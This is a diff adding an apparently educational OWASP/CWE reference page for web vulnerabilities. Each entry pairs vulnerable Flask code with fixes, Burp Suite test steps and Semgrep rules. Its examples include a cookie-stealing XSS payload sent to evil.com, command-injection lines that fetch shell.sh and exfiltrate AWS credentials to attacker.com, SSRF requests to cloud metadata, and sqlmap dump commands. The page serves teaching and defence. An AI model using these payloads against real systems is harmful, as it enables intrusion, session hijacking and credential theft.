@@ -1,0 +1,907 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OWASP Top 10 + CWE Top 25 — Real Code & Tools</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0a0d14; color: #e2e8f0; min-height: 100vh; padding: 20px 14px; }
+
+h1 { text-align: center; font-size: 21px; font-weight: 700; color: #f1f5f9; margin-bottom: 4px; }
+.subtitle { text-align: center; font-size: 12px; color: #64748b; margin-bottom: 22px; }
+
+/* Top nav */
+.top-nav { display: flex; gap: 6px; justify-content: center; margin-bottom: 20px; flex-wrap: wrap; }
+.top-btn { padding: 7px 16px; border-radius: 6px; border: 1.5px solid #2a2f3e; background: #13182a; color: #94a3b8; font-size: 12px; font-weight: 600; cursor: pointer; transition: all 0.15s; }
+.top-btn:hover { background: #1e2535; color: #e2e8f0; }
+.top-btn.active { background: #1d3461; border-color: #3b6fd4; color: #93c5fd; }
+
+/* Vuln list */
+.vuln-list { display: flex; flex-direction: column; gap: 6px; max-width: 900px; margin: 0 auto; }
+
+.vuln-row {
+  background: #111827; border: 1px solid #1f2937; border-radius: 10px;
+  overflow: hidden; cursor: pointer; transition: border-color 0.15s;
+}
+.vuln-row:hover { border-color: #374151; }
+.vuln-row.open { border-color: var(--vc); }
+
+.vuln-header {
+  display: flex; align-items: center; gap: 12px; padding: 13px 16px;
+  background: #111827;
+}
+.vuln-rank {
+  font-size: 11px; font-weight: 700; min-width: 38px;
+  color: var(--vc); background: var(--vc-bg);
+  border: 1px solid var(--vc); border-radius: 5px;
+  text-align: center; padding: 3px 5px;
+}
+.vuln-name { font-size: 14px; font-weight: 600; color: #f1f5f9; flex: 1; }
+.vuln-tags { display: flex; gap: 5px; flex-wrap: wrap; }
+.vtag { font-size: 10px; font-weight: 600; padding: 2px 7px; border-radius: 3px; }
+.vtag.crit { background: #450a0a; color: #fca5a5; border: 1px solid #7f1d1d; }
+.vtag.high { background: #431407; color: #fdba74; border: 1px solid #7c2d12; }
+.vtag.med  { background: #422006; color: #fde68a; border: 1px solid #78350f; }
+.vtag.tool { background: #0c1a2e; color: #7dd3fc; border: 1px solid #1e3a5f; }
+.vuln-chevron { color: #4b5563; font-size: 12px; transition: transform 0.2s; }
+.vuln-row.open .vuln-chevron { transform: rotate(90deg); }
+
+/* Detail panel */
+.vuln-detail { display: none; padding: 0 16px 16px; border-top: 1px solid #1f2937; }
+.vuln-row.open .vuln-detail { display: block; }
+
+/* Tabs inside vuln */
+.inner-tabs { display: flex; gap: 4px; margin: 14px 0 12px; flex-wrap: wrap; }
+.itab { padding: 5px 12px; border-radius: 5px; border: 1px solid #2a2f3e; background: #0d1117; color: #64748b; font-size: 12px; cursor: pointer; transition: all 0.12s; font-weight: 500; }
+.itab:hover { color: #94a3b8; background: #13182a; }
+.itab.active { background: #1e2d45; border-color: #3b6fd4; color: #93c5fd; }
+
+.inner-panel { display: none; }
+.inner-panel.active { display: block; }
+
+/* Code block */
+.cb { background: #060b12; border: 1px solid #1a2535; border-radius: 8px; padding: 14px 16px; margin: 8px 0; overflow-x: auto; }
+.cb-label { font-size: 10px; color: #4b5563; font-weight: 700; letter-spacing: 0.1em; text-transform: uppercase; margin-bottom: 8px; display: flex; align-items: center; gap: 8px; }
+.cb-label .badge { font-size: 10px; padding: 1px 7px; border-radius: 3px; font-weight: 700; }
+.badge-vuln { background: #450a0a; color: #fca5a5; }
+.badge-fix  { background: #14532d; color: #86efac; }
+.badge-exploit { background: #1c1010; color: #f97316; border: 1px solid #7c2d12; }
+.badge-burp { background: #0c1a2e; color: #7dd3fc; border: 1px solid #1e3a5f; }
+.badge-sast { background: #1a1a2e; color: #a5b4fc; border: 1px solid #3730a3; }
+
+pre { font-family: 'Courier New', monospace; font-size: 12px; line-height: 1.7; color: #94a3b8; white-space: pre; }
+.kw  { color: #c084fc; }
+.str { color: #86efac; }
+.cm  { color: #374151; font-style: italic; }
+.fn  { color: #7dd3fc; }
+.ev  { color: #fb923c; }
+.ok  { color: #4ade80; }
+.er  { color: #f87171; }
+.hl  { background: #1f0a0a; color: #fca5a5; }
+.hlg { background: #0a1f0a; color: #86efac; }
+
+/* Info cards */
+.info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
+@media (max-width: 560px) { .info-grid { grid-template-columns: 1fr; } }
+.ic { background: #0d1117; border: 1px solid #1f2937; border-radius: 8px; padding: 13px 14px; }
+.ic h5 { font-size: 12px; font-weight: 600; color: var(--vc); margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.05em; }
+.ic ul { list-style: none; }
+.ic ul li { font-size: 12px; color: #9ca3af; padding: 3px 0 3px 13px; position: relative; line-height: 1.5; }
+.ic ul li::before { content: "›"; position: absolute; left: 0; color: var(--vc); }
+
+.desc-box { background: #0d1117; border-left: 3px solid var(--vc); border-radius: 0 6px 6px 0; padding: 11px 14px; margin-bottom: 10px; }
+.desc-box p { font-size: 13px; color: #9ca3af; line-height: 1.6; }
+.desc-box strong { color: #e2e8f0; }
+
+.tool-row { display: flex; flex-wrap: wrap; gap: 5px; margin-top: 10px; }
+.tp { display: inline-flex; align-items: center; gap: 5px; background: #0d1117; border: 1px solid #2a3a50; border-radius: 5px; padding: 3px 9px; font-size: 11px; color: #7dd3fc; }
+.tp::before { content: "⚒"; font-size: 10px; }
+
+.impact-bar { display: flex; align-items: center; gap: 8px; margin: 6px 0; }
+.impact-bar span { font-size: 12px; color: #6b7280; min-width: 90px; }
+.bar { height: 6px; border-radius: 3px; background: var(--vc); opacity: 0.85; }
+</style>
+</head>
+<body>
+
+<h1>OWASP Top 10 + CWE Top 25</h1>
+<p class="subtitle">Real vulnerable code · Burp Suite usage · Exploitation · Fix — click any vuln to expand</p>
+
+<div class="top-nav">
+  <button class="top-btn active" onclick="filterVulns('all')">All Vulnerabilities</button>
+  <button class="top-btn" onclick="filterVulns('owasp')">OWASP Top 10</button>
+  <button class="top-btn" onclick="filterVulns('cwe')">CWE Top 25</button>
+  <button class="top-btn" onclick="filterVulns('critical')">Critical Only</button>
+</div>
+
+<div class="vuln-list" id="vulnList"></div>
+
+<script>
+const vulns = [
+  {
+    id: 'sqli',
+    rank: 'A03 / CWE-89',
+    name: 'SQL Injection',
+    sev: 'crit', tags: ['Critical','CWE-89','A03:2021'],
+    color: '#f87171', colorBg: '#1f0505',
+    owasp: true, cwe: true,
+    desc: '<strong>User-supplied input is directly concatenated into a SQL query without sanitization.</strong> Attacker can manipulate the query to bypass auth, dump databases, or delete data. #1 most impactful web vuln.',
+    impact: { conf: 100, integ: 100, avail: 80 },
+    howFind: ['Add single quote <code>\'</code> to any input — look for SQL errors','Use Burp Intruder with SQLi payload list on all parameters','sqlmap -u "http://target/api/user?id=1" --dbs','Look for numeric IDs in URLs — prime SQLi candidates','Check login forms — classic auth bypass target'],
+    tools: ['Burp Suite Intruder','sqlmap','Burp Scanner','OWASP ZAP'],
+    vulnCode: `<span class="cm"># VULNERABLE Python — Flask API endpoint</span>
+<span class="kw">@app</span>.route(<span class="str">'/api/experiment'</span>)
+<span class="kw">def</span> <span class="fn">get_experiment</span>():
+    exp_id = request.args.get(<span class="str">'id'</span>)         <span class="cm"># user input</span>
+    query = <span class="er">"SELECT * FROM experiments WHERE id = '"</span> + exp_id + <span class="er">"'"</span>
+    <span class="cm">#        ↑ DANGER: string concat with user input</span>
+    result = db.execute(query)
+    <span class="kw">return</span> jsonify(result)
+
+<span class="cm"># ATTACKER sends:  /api/experiment?id=1' OR '1'='1</span>
+<span class="cm"># Query becomes:   SELECT * FROM experiments WHERE id = '1' OR '1'='1'</span>
+<span class="cm"># Result: returns ALL experiments from ALL organizations!</span>
+
+<span class="cm"># WORSE: /api/experiment?id=1'; DROP TABLE experiments;--</span>`,
+    fixCode: `<span class="cm"># FIXED — Parameterized query</span>
+<span class="kw">@app</span>.route(<span class="str">'/api/experiment'</span>)
+<span class="kw">def</span> <span class="fn">get_experiment</span>():
+    exp_id = request.args.get(<span class="str">'id'</span>)
+    query = <span class="str">"SELECT * FROM experiments WHERE id = ?"</span>
+    result = db.execute(query, [exp_id])  <span class="ok"># ✓ parameterized</span>
+    <span class="kw">return</span> jsonify(result)
+
+<span class="cm"># Also use an ORM like SQLAlchemy:</span>
+experiment = Experiment.query.<span class="fn">filter_by</span>(id=exp_id).first()`,
+    burpSteps: `<span class="cm"># Step 1: Intercept the request in Burp Proxy</span>
+GET /api/experiment?id=1 HTTP/1.1
+Host: benchling.com
+
+<span class="cm"># Step 2: Send to Repeater (Ctrl+R), modify id:</span>
+GET /api/experiment?id=<span class="er">1' OR '1'='1</span> HTTP/1.1
+
+<span class="cm"># Step 3: Look at response — if returns all data = SQLi confirmed</span>
+
+<span class="cm"># Step 4: Send to Intruder, mark §id§, load SQLi payload list</span>
+<span class="cm"># Payloads: https://github.com/swisskyrepo/PayloadsAllTheThings</span>
+
+<span class="cm"># Step 5: Automate with sqlmap:</span>
+sqlmap -u <span class="str">"http://target/api/experiment?id=1"</span> \
+  --cookie=<span class="str">"session=YOUR_TOKEN"</span> \
+  --dbs --dump -T experiments`,
+    sastRule: `<span class="cm"># Semgrep rule to detect SQL injection</span>
+<span class="kw">rules:</span>
+  - <span class="kw">id:</span> sql-injection
+    <span class="kw">pattern-either:</span>
+      - <span class="kw">pattern:</span> <span class="str">db.execute(... + $X)</span>
+      - <span class="kw">pattern:</span> <span class="str">db.execute(f"...{$X}...")</span>
+    <span class="kw">message:</span> <span class="str">"SQL injection: user input in query"</span>
+    <span class="kw">severity:</span> ERROR
+    <span class="kw">languages:</span> [python]`
+  },
+  {
+    id: 'xss',
+    rank: 'A03 / CWE-79',
+    name: 'Cross-Site Scripting (XSS)',
+    sev: 'high', tags: ['High','CWE-79','A03:2021'],
+    color: '#fb923c', colorBg: '#1f0e05',
+    owasp: true, cwe: true,
+    desc: '<strong>User input is reflected back in HTML without encoding.</strong> Attacker injects JavaScript that runs in victim\'s browser — steals cookies, hijacks sessions, redirects users. Three types: Reflected, Stored, DOM-based.',
+    impact: { conf: 80, integ: 60, avail: 20 },
+    howFind: ['Inject <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> in every input','Use Burp Scanner — it auto-detects reflected XSS','Check search bars, comment fields, profile fields','Stored XSS: inject and check if it fires on another page','DOM XSS: look at JS source for dangerous sinks like innerHTML'],
+    tools: ['Burp Suite Scanner','OWASP ZAP','Dalfox','XSStrike'],
+    vulnCode: `<span class="cm"># VULNERABLE — Flask template renders unescaped user input</span>
+<span class="kw">@app</span>.route(<span class="str">'/search'</span>)
+<span class="kw">def</span> <span class="fn">search</span>():
+    query = request.args.get(<span class="str">'q'</span>)
+    <span class="cm"># Jinja2 with | safe — disables auto-escaping!</span>
+    <span class="kw">return</span> <span class="fn">render_template_string</span>(
+        <span class="er">f'&lt;h2&gt;Results for: {query}&lt;/h2&gt;'</span>  <span class="cm"># DANGER</span>
+    )
+
+<span class="cm"># ATTACKER sends:</span>
+<span class="cm"># /search?q=&lt;script&gt;document.location='https://evil.com?c='+document.cookie&lt;/script&gt;</span>
+<span class="cm"># Victim's cookie sent to attacker's server — session hijacked!</span>
+
+<span class="cm"># STORED XSS — in research notes field:</span>
+<span class="kw">def</span> <span class="fn">save_note</span>(content):
+    db.execute(<span class="str">"INSERT INTO notes VALUES (?)"</span>, [content])
+    <span class="cm"># content = "&lt;img src=x onerror=alert(document.cookie)&gt;"</span>
+    <span class="cm"># Fires every time ANY user views this note!</span>`,
+    fixCode: `<span class="cm"># FIXED — always escape output</span>
+<span class="kw">from</span> markupsafe <span class="kw">import</span> escape
+
+<span class="kw">@app</span>.route(<span class="str">'/search'</span>)
+<span class="kw">def</span> <span class="fn">search</span>():
+    query = request.args.get(<span class="str">'q'</span>)
+    safe_query = <span class="fn">escape</span>(query)  <span class="ok"># converts &lt; to &amp;lt; etc.</span>
+    <span class="kw">return</span> render_template(<span class="str">'search.html'</span>, query=safe_query)
+
+<span class="cm"># In template — use {{ query }} NOT {{ query | safe }}</span>
+<span class="cm"># Set Content-Security-Policy header:</span>
+<span class="cm"># Content-Security-Policy: default-src 'self'; script-src 'self'</span>`,
+    burpSteps: `<span class="cm"># Step 1: In Burp Proxy, intercept search request</span>
+GET /search?q=test HTTP/1.1
+
+<span class="cm"># Step 2: Send to Repeater, change q to XSS payload</span>
+GET /search?q=<span class="er">&lt;script&gt;alert(1)&lt;/script&gt;</span> HTTP/1.1
+
+<span class="cm"># Step 3: Check response — is the script tag in HTML?</span>
+<span class="cm"># Response body: &lt;h2&gt;Results for: &lt;script&gt;alert(1)&lt;/script&gt;&lt;/h2&gt;</span>
+<span class="cm"># If yes = Reflected XSS confirmed</span>
+
+<span class="cm"># Step 4: Use Burp Scanner on the endpoint:</span>
+<span class="cm"># Right-click request → Scan → Active Scan</span>
+
+<span class="cm"># Step 5: For blind XSS, use Burp Collaborator payload:</span>
+<span class="er">&lt;script&gt;fetch('https://YOUR-COLLABORATOR.burpcollaborator.net?c='+document.cookie)&lt;/script&gt;</span>`,
+    sastRule: `<span class="cm"># Bandit (Python) detects unsafe template rendering</span>
+<span class="cm"># Run: bandit -r ./app -t B703,B704</span>
+
+<span class="cm"># Semgrep rule:</span>
+<span class="kw">rules:</span>
+  - <span class="kw">id:</span> xss-render-template-string
+    <span class="kw">pattern:</span> <span class="str">render_template_string(f"...{$X}...")</span>
+    <span class="kw">message:</span> <span class="str">"Potential XSS: user input in template"</span>
+    <span class="kw">severity:</span> WARNING`
+  },
+  {
+    id: 'idor',
+    rank: 'A01 / CWE-639',
+    name: 'Broken Access Control / IDOR',
+    sev: 'crit', tags: ['Critical','CWE-639','A01:2021'],
+    color: '#f87171', colorBg: '#1f0505',
+    owasp: true, cwe: true,
+    desc: '<strong>#1 in OWASP 2021.</strong> App uses user-controlled IDs to access objects without verifying the requesting user owns that object. Attacker changes an ID in the URL/body to access another user\'s data. Extremely common in APIs.',
+    impact: { conf: 100, integ: 80, avail: 30 },
+    howFind: ['Find any numeric/UUID in URL or request body','Change it to +1, -1, or another user\'s ID in Burp Repeater','Create two accounts — access account B\'s data logged in as A','Use Burp Intruder to enumerate IDs automatically','Check API endpoints: /api/users/{id}, /api/orders/{id}'],
+    tools: ['Burp Suite Repeater','Burp Intruder','Autorize (Burp extension)','Manual testing'],
+    vulnCode: `<span class="cm"># VULNERABLE — no ownership check on experiment access</span>
+<span class="kw">@app</span>.route(<span class="str">'/api/experiments/&lt;int:exp_id&gt;'</span>)
+<span class="kw">@login_required</span>
+<span class="kw">def</span> <span class="fn">get_experiment</span>(exp_id):
+    <span class="cm"># Only checks if user is logged in — NOT if they own it!</span>
+    experiment = Experiment.query.<span class="fn">get</span>(exp_id)
+    <span class="kw">if not</span> experiment:
+        <span class="kw">return</span> <span class="fn">abort</span>(404)
+    <span class="kw">return</span> <span class="fn">jsonify</span>(experiment)  <span class="er"># returns ANY org's data!</span>
+
+<span class="cm"># Attacker (Org A) sends: GET /api/experiments/4522</span>
+<span class="cm"># Gets Org B's proprietary research data — CRITICAL breach</span>`,
+    fixCode: `<span class="cm"># FIXED — enforce organization-scoped access</span>
+<span class="kw">@app</span>.route(<span class="str">'/api/experiments/&lt;int:exp_id&gt;'</span>)
+<span class="kw">@login_required</span>
+<span class="kw">def</span> <span class="fn">get_experiment</span>(exp_id):
+    experiment = Experiment.query.<span class="fn">get</span>(exp_id)
+    <span class="kw">if not</span> experiment:
+        <span class="kw">return</span> <span class="fn">abort</span>(404)
+
+    <span class="cm"># ✓ Enforce ownership — check org matches</span>
+    <span class="kw">if</span> experiment.org_id != current_user.org_id:
+        <span class="kw">return</span> <span class="fn">abort</span>(403)  <span class="ok"># Forbidden</span>
+
+    <span class="kw">return</span> <span class="fn">jsonify</span>(experiment)
+
+<span class="cm"># Even better — query scoped to org from the start:</span>
+experiment = Experiment.query.<span class="fn">filter_by</span>(
+    id=exp_id, org_id=current_user.org_id
+).first_or_404()`,
+    burpSteps: `<span class="cm"># Step 1: Log in as User A, browse to your experiment</span>
+GET /api/experiments/<span class="ev">4521</span> HTTP/1.1
+Cookie: session=USER_A_TOKEN
+
+<span class="cm"># Step 2: Send to Repeater, change ID to 4522</span>
+GET /api/experiments/<span class="er">4522</span> HTTP/1.1
+Cookie: session=USER_A_TOKEN
+
+<span class="cm"># Step 3: If response returns data = IDOR confirmed!</span>
+<span class="cm"># Response: {"id":4522,"org":"BioTech Corp","data":"proprietary..."}</span>
+
+<span class="cm"># Step 4: Automate with Intruder — enumerate IDs</span>
+GET /api/experiments/§4521§
+<span class="cm"># Set payload: numbers 4500-4600</span>
+<span class="cm"># Filter responses by length — different = found data</span>
+
+<span class="cm"># Step 5: Install Autorize extension in Burp</span>
+<span class="cm"># Auto-tests every request with a low-priv token</span>`,
+    sastRule: `<span class="cm"># SAST cannot fully detect IDOR — needs manual review</span>
+<span class="cm"># But Semgrep can flag missing auth checks:</span>
+<span class="kw">rules:</span>
+  - <span class="kw">id:</span> missing-ownership-check
+    <span class="kw">patterns:</span>
+      - <span class="kw">pattern:</span> <span class="str">$OBJ = $Model.query.get($ID)</span>
+      - <span class="kw">pattern-not:</span> <span class="str">$OBJ.user_id == current_user.id</span>
+    <span class="kw">message:</span> <span class="str">"Possible IDOR: no ownership check after object fetch"</span>`
+  },
+  {
+    id: 'authz',
+    rank: 'A07 / CWE-287',
+    name: 'Authentication Failures',
+    sev: 'crit', tags: ['Critical','CWE-287','A07:2021'],
+    color: '#e879f9', colorBg: '#1a0520',
+    owasp: true, cwe: true,
+    desc: '<strong>Weak authentication allows attackers to compromise accounts.</strong> Includes: weak passwords, missing brute-force protection, insecure session tokens, JWT vulnerabilities, missing MFA. Often leads to complete account takeover.',
+    impact: { conf: 100, integ: 100, avail: 60 },
+    howFind: ['Try default credentials: admin/admin, admin/password','Test for brute-force: send 100 login attempts — is there lockout?','Inspect JWT token — decode at jwt.io — check algorithm','Try JWT alg:none attack — remove signature','Check if session cookie has Secure and HttpOnly flags'],
+    tools: ['Burp Intruder (brute force)','Hydra','jwt_tool','Burp Repeater'],
+    vulnCode: `<span class="cm"># VULNERABLE 1 — No brute force protection</span>
+<span class="kw">@app</span>.route(<span class="str">'/login'</span>, methods=[<span class="str">'POST'</span>])
+<span class="kw">def</span> <span class="fn">login</span>():
+    username = request.form[<span class="str">'username'</span>]
+    password = request.form[<span class="str">'password'</span>]
+    user = User.query.<span class="fn">filter_by</span>(username=username).first()
+    <span class="kw">if</span> user <span class="kw">and</span> user.password == password:  <span class="er"># plaintext!</span>
+        session[<span class="str">'user'</span>] = username
+        <span class="kw">return</span> redirect(<span class="str">'/'</span>)
+    <span class="cm"># No rate limiting — attacker can try 10000 passwords/sec</span>
+
+<span class="cm"># VULNERABLE 2 — JWT with alg:none</span>
+<span class="kw">import</span> jwt
+token = jwt.<span class="fn">decode</span>(token, options={<span class="str">"verify_signature"</span>: <span class="er">False</span>})
+<span class="cm"># Attacker crafts token: {"alg":"none"} + {"user":"admin"} — no sig needed!</span>`,
+    fixCode: `<span class="cm"># FIXED — bcrypt + rate limiting + secure JWT</span>
+<span class="kw">from</span> flask_limiter <span class="kw">import</span> Limiter
+<span class="kw">from</span> bcrypt <span class="kw">import</span> checkpw
+limiter = <span class="fn">Limiter</span>(app, default_limits=[<span class="str">"5 per minute"</span>])
+
+<span class="kw">@app</span>.route(<span class="str">'/login'</span>, methods=[<span class="str">'POST'</span>])
+<span class="kw">@limiter.limit</span>(<span class="str">"5 per minute"</span>)   <span class="ok"># ✓ brute-force protection</span>
+<span class="kw">def</span> <span class="fn">login</span>():
+    user = User.query.<span class="fn">filter_by</span>(username=username).first()
+    <span class="kw">if</span> user <span class="kw">and</span> <span class="fn">checkpw</span>(password, user.password_hash):  <span class="ok"># ✓ bcrypt</span>
+        <span class="kw">return</span> <span class="fn">create_jwt_token</span>(user)
+
+<span class="cm"># JWT — always verify signature with secret:</span>
+token = jwt.<span class="fn">decode</span>(token, SECRET_KEY, algorithms=[<span class="str">"HS256"</span>])`,
+    burpSteps: `<span class="cm"># Test 1: Brute force with Burp Intruder</span>
+POST /login HTTP/1.1
+username=admin&password=§password§
+
+<span class="cm"># Load password wordlist (rockyou.txt)</span>
+<span class="cm"># 200 response or redirect = success</span>
+
+<span class="cm"># Test 2: JWT manipulation in Burp Repeater</span>
+<span class="cm"># Decode token at jwt.io</span>
+<span class="cm"># Payload: {"user": "admin", "role": "user"}</span>
+<span class="cm"># Change role to "admin", re-sign or try alg:none</span>
+
+<span class="cm"># Test 3: Session fixation</span>
+<span class="cm"># Copy session cookie before login</span>
+<span class="cm"># After login — does the cookie change? If not = fixation vuln</span>
+
+<span class="cm"># Test 4: Check cookie flags in Burp response:</span>
+Set-Cookie: session=abc123  <span class="er"># MISSING Secure; HttpOnly; SameSite</span>
+Set-Cookie: session=abc123; <span class="ok">Secure; HttpOnly; SameSite=Strict</span>`,
+    sastRule: `<span class="cm"># Bandit detects hardcoded secrets and weak hashing</span>
+<span class="cm"># B303: Use of MD5 or SHA1</span>
+<span class="cm"># B105: Hardcoded password</span>
+
+<span class="cm"># Semgrep — detect plaintext password comparison:</span>
+<span class="kw">rules:</span>
+  - <span class="kw">id:</span> plaintext-password-compare
+    <span class="kw">pattern:</span> <span class="str">user.password == $INPUT</span>
+    <span class="kw">message:</span> <span class="str">"Plaintext password comparison — use bcrypt"</span>
+    <span class="kw">severity:</span> ERROR`
+  },
+  {
+    id: 'ssrf',
+    rank: 'A10 / CWE-918',
+    name: 'Server-Side Request Forgery (SSRF)',
+    sev: 'crit', tags: ['Critical','CWE-918','A10:2021'],
+    color: '#f87171', colorBg: '#1f0505',
+    owasp: true, cwe: true,
+    desc: '<strong>App fetches a URL supplied by the user — attacker points it at internal systems.</strong> In cloud environments (AWS/GCP), SSRF can leak the instance metadata endpoint (169.254.169.254) exposing IAM credentials. Led to the 2019 Capital One breach.',
+    impact: { conf: 100, integ: 60, avail: 40 },
+    howFind: ['Find any URL input field: webhook URL, import from URL, image URL','Submit http://169.254.169.254/latest/meta-data/ (AWS metadata)','Use Burp Collaborator URL — did the server make a request?','Try http://localhost, http://internal-service, http://10.0.0.1','Check for blind SSRF using out-of-band DNS callbacks'],
+    tools: ['Burp Collaborator','Burp Repeater','SSRFmap','Interactsh'],
+    vulnCode: `<span class="cm"># VULNERABLE — app fetches user-supplied URL</span>
+<span class="kw">import</span> requests
+
+<span class="kw">@app</span>.route(<span class="str">'/api/import'</span>)
+<span class="kw">def</span> <span class="fn">import_data</span>():
+    url = request.args.get(<span class="str">'url'</span>)  <span class="cm"># user controls this!</span>
+    response = requests.<span class="fn">get</span>(url)   <span class="er"># fetches whatever attacker wants</span>
+    <span class="kw">return</span> response.text
+
+<span class="cm"># ATTACKER sends:</span>
+<span class="cm"># /api/import?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/</span>
+<span class="cm"># Response leaks AWS IAM keys — complete cloud compromise!</span>
+
+<span class="cm"># ATTACKER can also scan internal network:</span>
+<span class="cm"># /api/import?url=http://10.0.0.1:8080/admin  (internal service)</span>`,
+    fixCode: `<span class="cm"># FIXED — allowlist validation + block metadata IPs</span>
+<span class="kw">from</span> urllib.parse <span class="kw">import</span> urlparse
+<span class="kw">import</span> ipaddress
+
+ALLOWED_DOMAINS = [<span class="str">'api.trusted.com'</span>, <span class="str">'data.partner.com'</span>]
+BLOCKED_IPS = [<span class="str">'169.254.0.0/16'</span>, <span class="str">'10.0.0.0/8'</span>, <span class="str">'172.16.0.0/12'</span>]
+
+<span class="kw">def</span> <span class="fn">is_safe_url</span>(url):
+    parsed = <span class="fn">urlparse</span>(url)
+    <span class="kw">if</span> parsed.hostname <span class="kw">not in</span> ALLOWED_DOMAINS:
+        <span class="kw">return</span> False  <span class="ok"># ✓ allowlist domains only</span>
+    <span class="cm"># Resolve and block internal IPs</span>
+    ip = <span class="fn">socket.gethostbyname</span>(parsed.hostname)
+    <span class="kw">for</span> blocked <span class="kw">in</span> BLOCKED_IPS:
+        <span class="kw">if</span> ipaddress.<span class="fn">ip_address</span>(ip) <span class="kw">in</span> ipaddress.<span class="fn">ip_network</span>(blocked):
+            <span class="kw">return</span> False  <span class="ok"># ✓ block RFC1918 + metadata IPs</span>
+    <span class="kw">return</span> True`,
+    burpSteps: `<span class="cm"># Step 1: Find URL parameter in request</span>
+GET /api/import?url=https://external.com/data.json
+
+<span class="cm"># Step 2: In Burp Repeater, change to internal target</span>
+GET /api/import?url=<span class="er">http://169.254.169.254/latest/meta-data/</span>
+
+<span class="cm"># Step 3: If response contains AWS metadata = CRITICAL SSRF</span>
+<span class="cm"># Response: {"Code":"Success","AccessKeyId":"ASIA...","SecretAccessKey":"..."}</span>
+
+<span class="cm"># Step 4: For blind SSRF — use Burp Collaborator</span>
+GET /api/import?url=<span class="er">http://YOUR-ID.burpcollaborator.net</span>
+<span class="cm"># Check Collaborator tab — did server make DNS/HTTP request?</span>
+
+<span class="cm"># Step 5: Try other internal services:</span>
+<span class="cm"># http://localhost:6379  (Redis)</span>
+<span class="cm"># http://localhost:9200  (Elasticsearch)</span>
+<span class="cm"># http://internal-db:5432 (Postgres)</span>`,
+    sastRule: `<span class="cm"># Semgrep rule — detect unvalidated URL fetch</span>
+<span class="kw">rules:</span>
+  - <span class="kw">id:</span> ssrf-unvalidated-url
+    <span class="kw">patterns:</span>
+      - <span class="kw">pattern:</span> <span class="str">requests.get($URL)</span>
+      - <span class="kw">pattern-either:</span>
+          - <span class="kw">pattern:</span> <span class="str">$URL = request.args.get(...)</span>
+          - <span class="kw">pattern:</span> <span class="str">$URL = request.form.get(...)</span>
+    <span class="kw">message:</span> <span class="str">"Potential SSRF: user-controlled URL fetched"</span>
+    <span class="kw">severity:</span> ERROR`
+  },
+  {
+    id: 'cmdi',
+    rank: 'CWE-78',
+    name: 'OS Command Injection',
+    sev: 'crit', tags: ['Critical','CWE-78'],
+    color: '#f87171', colorBg: '#1f0505',
+    owasp: false, cwe: true,
+    desc: '<strong>User input is passed to a system shell command.</strong> Attacker appends shell operators (;, |, &&) to inject arbitrary OS commands — full server compromise, data exfiltration, reverse shells.',
+    impact: { conf: 100, integ: 100, avail: 100 },
+    howFind: ['Test with: <code>; ls</code>, <code>| whoami</code>, <code>&& id</code>','Look for features: file conversion, ping, DNS lookup, report generation','Use Burp Repeater to test every parameter','Try blind: <code>; sleep 10</code> — if response delays = blind CMDi','Use Burp Collaborator for out-of-band detection'],
+    tools: ['Burp Suite Repeater','Commix','Burp Collaborator'],
+    vulnCode: `<span class="cm"># VULNERABLE — user input passed to shell</span>
+<span class="kw">import</span> os, subprocess
+
+<span class="kw">@app</span>.route(<span class="str">'/api/ping'</span>)
+<span class="kw">def</span> <span class="fn">ping_host</span>():
+    host = request.args.get(<span class="str">'host'</span>)
+    <span class="cm"># Intended: ping a server to check connectivity</span>
+    result = os.<span class="fn">system</span>(<span class="er">f"ping -c 1 {host}"</span>)  <span class="er"># DANGER!</span>
+    <span class="kw">return</span> str(result)
+
+<span class="cm"># ATTACKER sends:</span>
+<span class="cm"># /api/ping?host=8.8.8.8; cat /etc/passwd</span>
+<span class="cm"># /api/ping?host=8.8.8.8 | wget https://evil.com/shell.sh | bash</span>
+<span class="cm"># /api/ping?host=8.8.8.8; curl https://attacker.com?data=$(cat /etc/aws/credentials)</span>`,
+    fixCode: `<span class="cm"># FIXED — use subprocess with list args (no shell=True)</span>
+<span class="kw">import</span> subprocess, re
+
+<span class="kw">def</span> <span class="fn">is_valid_host</span>(host):
+    <span class="cm"># Strict allowlist — only valid hostname/IP chars</span>
+    <span class="kw">return</span> bool(re.<span class="fn">match</span>(<span class="str">r'^[a-zA-Z0-9.\-]{1,253}$'</span>, host))
+
+<span class="kw">@app</span>.route(<span class="str">'/api/ping'</span>)
+<span class="kw">def</span> <span class="fn">ping_host</span>():
+    host = request.args.get(<span class="str">'host'</span>)
+    <span class="kw">if not</span> <span class="fn">is_valid_host</span>(host):
+        <span class="kw">return</span> <span class="fn">abort</span>(400)
+    <span class="cm"># List args = no shell expansion, injection impossible</span>
+    result = subprocess.<span class="fn">run</span>([<span class="str">'ping'</span>, <span class="str">'-c'</span>, <span class="str">'1'</span>, host],
+        capture_output=True, timeout=5)  <span class="ok"># ✓ safe</span>
+    <span class="kw">return</span> result.stdout`,
+    burpSteps: `<span class="cm"># Step 1: Intercept ping request</span>
+GET /api/ping?host=8.8.8.8
+
+<span class="cm"># Step 2: Repeater — inject command separator</span>
+GET /api/ping?host=<span class="er">8.8.8.8; whoami</span>
+GET /api/ping?host=<span class="er">8.8.8.8 | id</span>
+GET /api/ping?host=<span class="er">8.8.8.8 %26%26 ls -la</span>   (URL encoded &&)
+
+<span class="cm"># Step 3: If response shows "www-data" or file listing = CMDi!</span>
+
+<span class="cm"># Step 4: Blind CMDi — time-based detection</span>
+GET /api/ping?host=<span class="er">8.8.8.8; sleep 10</span>
+<span class="cm"># If response takes 10+ seconds = blind CMDi confirmed</span>
+
+<span class="cm"># Step 5: Exfiltrate data via Burp Collaborator</span>
+GET /api/ping?host=<span class="er">8.8.8.8; curl http://COLLABORATOR?d=$(whoami)</span>`,
+    sastRule: `<span class="cm"># Bandit B605, B607 — detects shell=True and os.system</span>
+<span class="cm"># Run: bandit -r ./app -t B605,B607,B602</span>
+
+<span class="cm"># Semgrep:</span>
+<span class="kw">rules:</span>
+  - <span class="kw">id:</span> command-injection
+    <span class="kw">pattern-either:</span>
+      - <span class="kw">pattern:</span> <span class="str">os.system(...)</span>
